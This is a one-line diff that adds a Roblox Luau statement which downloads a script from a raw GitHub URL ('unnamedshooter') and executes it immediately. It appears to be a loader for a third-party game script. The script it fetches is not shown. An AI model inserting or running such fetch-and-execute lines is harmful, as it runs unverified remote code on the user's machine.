@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dprtq/unnamedshooter/refs/heads/main/unmdshtr.luau"))()
